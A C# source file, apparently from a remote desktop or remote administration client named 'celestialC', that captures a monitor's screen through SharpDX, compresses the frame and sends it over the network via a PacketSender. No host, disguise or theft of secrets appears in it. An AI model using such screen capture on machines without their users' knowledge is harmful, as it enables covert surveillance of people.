using SharpDX.Direct3D9;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Drawing;
using System.Security.Permissions;
using celestialC.Helper.Services.compression;

namespace celestialC.Helper
{
    public static class DirectXController
    {
        public static bool RemoteDesktopActive = false;
        private static Device _device;
        private static DisplayMode _displayMode;
        private static Surface _surface;
        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        private static Device CreateDevice(Direct3D direct3D, int monitor, DisplayMode displayMode)
        {
            var parameters = new PresentParameters
            {
                Windowed = true,
                BackBufferCount = 1,
                BackBufferHeight = displayMode.Height,
                BackBufferWidth = displayMode.Width,
                SwapEffect = SwapEffect.Discard
            };
            return new Device(direct3D, monitor, DeviceType.Hardware, IntPtr.Zero,
                CreateFlags.SoftwareVertexProcessing, parameters);
        }
        public static bool Initialize(int monitor)
        {
            try
            {
                using (var direct3D = new Direct3D())
                {
                    var displayMode = direct3D.GetAdapterDisplayMode(monitor);
                    using (var device = CreateDevice(direct3D, 0, displayMode))
                    {
                        try
                        {
                            var direct3d = new Direct3D();
                            _displayMode = direct3d.GetAdapterDisplayMode(monitor);
                            _device = CreateDevice(direct3d, monitor, _displayMode);
                            _surface = Surface.CreateOffscreenPlain(_device, _displayMode.Width, _displayMode.Height, Format.A8R8G8B8, Pool.Scratch);
                            return true;
                        }
                        catch { return false; }
                    }
                }
            }
            catch { return false; }
        }

        public static void Dispose()
        {
            _device?.Dispose();
            _surface?.Dispose();

            _device = null;
            _surface = null;
        }

        public static void sendScreenShot(IStreamCodec streamCodec)
        {
            try
            {
                byte[] ImageBytes = null;
                _device?.GetFrontBufferData(0, _surface);
                var rectangle = _surface.LockRectangle(LockFlags.None);
                try
                {
                    ImageBytes = streamCodec.CodeImage(rectangle.DataPointer,
                        new Rectangle(0, 0, _displayMode.Width, _displayMode.Height),
                        new Size(_displayMode.Width, _displayMode.Height), PixelFormat.Format32bppArgb).ToArray();
                }
                finally
                {
                    _surface?.UnlockRectangle();
                }
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.ImageType);
                ToSend.AddRange(ImageBytes);
                PacketSender.Send(ToSend.ToArray());
            }
            catch { Console.WriteLine("exception."); }
        }
    }
}
